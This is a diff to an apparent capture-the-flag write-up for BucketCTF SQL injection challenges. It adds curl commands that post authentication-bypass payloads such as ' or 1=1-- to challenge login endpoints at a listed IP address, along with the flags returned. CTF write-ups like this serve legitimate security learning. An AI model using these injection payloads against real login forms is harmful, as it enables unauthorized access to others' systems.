@@ -45,6 +45,13 @@ This is my first time using SQL. Its such a great and simple tool.
 
 I attempted several payloads, but ultimately, this one worked: `' or 1=1--`
 
+```bash
+┌──(kali㉿iasad)-[~/CTFs/BucketCTF]
+└─$ curl -d "userName=' or 1=1--&password=' or 1=1--" 213.133.103.186:7763/login
+
+bucket{s1mp13_sq11_ed0176a}
+```
+
 ![Untitled](/write-ups/ctftime/bucket/sqli-1.webp)
 
 &nbsp;
@@ -77,7 +84,14 @@ Ok I upgrade my security by preventing you from using semicolons. A StackOverflo
 
 ### Approach
 
-I attempted several payloads but found success with this one: `' OR 1 -- -`
+Again, I attempted several payloads but found success with this one: `' OR 1 -- -`
+
+```bash
+┌──(kali㉿iasad)-[~/CTFs/BucketCTF]
+└─$ curl -d "userName=' OR 1 -- -&password=' OR 1 -- -" 213.133.103.186:5900/login
+
+bucket{m3d1um_sq11_693f79541}
+```
 
 ![Untitled](/write-ups/ctftime/bucket/sqli-2.webp)
 
